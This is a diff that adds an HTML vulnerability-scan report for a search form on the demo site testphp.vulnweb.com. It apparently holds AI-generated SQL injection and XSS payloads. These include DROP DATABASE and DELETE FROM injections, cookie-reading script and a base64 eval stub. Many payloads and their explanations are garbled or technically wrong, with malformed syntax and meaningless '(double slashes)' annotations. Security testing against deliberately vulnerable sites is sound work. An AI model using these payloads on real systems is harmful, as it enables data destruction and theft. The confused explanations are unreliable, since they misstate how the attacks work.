@@ -1,0 +1,26 @@
+<h1>AI Vulnerability Scan Report</h1><p><strong>Target:</strong> http://testphp.vulnweb.com/</p><p><strong>Generated:</strong> 2025-04-23_01-01-37</p><hr><h2>Form: http://testphp.vulnweb.com/search.php?test=query</h2><p>Method: post</p><p>Inputs: searchFor, goButton</p><details><summary><strong>AI Output</strong></summary><pre>SQLi Payloads:
+- ' OR '1' = '1" // simple injection to bypass authentication
+- "', -- DROP TABLE art; SELECT * FROM users, (UNION SELECT NULL AS searchFor, username as result) as fakeResults WHERE FALSE LIMIT 1,"
+- "; DELETE FROM searches; -- // comments and malicious commands
+- %0A%3Ca+href=https://malicious.site/redirect onerror="alert('XSS')"%3EMalicious Link<%2Fa%3E// XSS that triggers alert in the iframe or parent window after click
+- "'; DROP SCHEMA art; -- // comment and drop a schema if authorized enough
+- ' UNION SELECT NULL, username AS searchFor FROM users - empty result from union to avoid data leakage but still log attempts (double slashes for extraction)
+- '; EXIT // force the execution of previous statements before exiting this session intentionally exploiting incomplete sanitization/execution flow control. -- escape sequences and unintended commands can be executed which could lead unautnerable access if possible elsewhere in code 
+- "'; DELETE FROM searches WHERE searchFor = ''; /* SQL injection to delete records as payload*/ // empty value for deletion with comment annotation (double slashes)
+- "; DROP DATABASE art -- intentionally drop the database 'art' by exploiting a vulnerability leading unaware access if possible elsewhere in code 
+- "' OR id IS NULL -- subtle SQL injection where it may return nothing or something specific due to conditional logic of query building based on input (single slash for extraction)
+- "'; DROP VIEW art_reviews AS SELECT * FROM searches WHERE searchFor = ''; /* Comment and drop a view as payload*/ // empty value deletion with comment annotation (double slashes) 
+
+XSS Payloads:
+- "<script>alert('XSS')</script>" - straightforward alert XSS script that pops up an alert dialog when the form is submitted or rendered somewhere.
+- " <img src=x onerror=alert(document.cookie)" - inject malicious image source with `onerror` event to trigger cookie stealing (double slashes)
+- "<div style='display:none;'><script>alert('XSS')</script></div>" - hidden script div that shows an alert, ensuring it doesn’t affect the visuals of web content when not exploited immediately. 
+- " <iframe onload="" src=x"></iframe>" - iframe with `onload` event to potentially trigger external scripts or further payloads (double slashes) within its source context if available and permissible by CORS policy, etc.
+- "<div style='display:none;'><style>.hidden { display: none !important; }</style><script>document.getElementsByClassName('hidden')[0].innerHTML = 'XSS here';</script></div>" - inline CSS to hide and inject script into DOM that changes content or functionality on the page (double slashes)
+- " <a href=x onclick='alert(1)>Malicious Link<span style='display:none;'>Hidden Tag for additional payload/logging.</span></a> <!-- Hidden span may serve as a trap to log attempts and link malicious site -->" - hyperlink with `onclick` event triggering an alert, containing another HTML element hidden within its attributes that could further the attack or logging.
+- " <input type='text' name='searchFor'> &lt;script&gt;document.getElementById('goButton').disabled=true;&lt;/script&gt;" - input field with script to disable a submit button directly in HTML, potentially manipulating form submission before it reaches server (double slashes)
+- "<!-- This comment contains a non-validated PHP code execution --><!php eval(base64_decode('aWY...'))-->" – attempt to exploit the system by executing arbitrary or malicious script after decoding base64 encoded content, assuming it is being processed and/or interpreted as executable (double slashes)
+- " <button type='submit'>Go</button> <!-- This button triggers an error due to bad attributes -->" - submit button with misleading `type` attribute which might lead the server or scripts processing form submission into errors under certain circumstances, exploiting a rare condition. (Double quotes for extraction and comment)
+- "<!DOCTYPE html><html><body onclick='alert(1)> " // simple XSS in HTML document itself to show an alert when clicked by end user directly without submitting the form
+
+Note: It's important that these payloads should not be used as they could cause harm. They are provided for educational and ethical pentesting purposes only, with necessary disclaimers given their potential risks if misused or sent to unintended targets</pre></details>
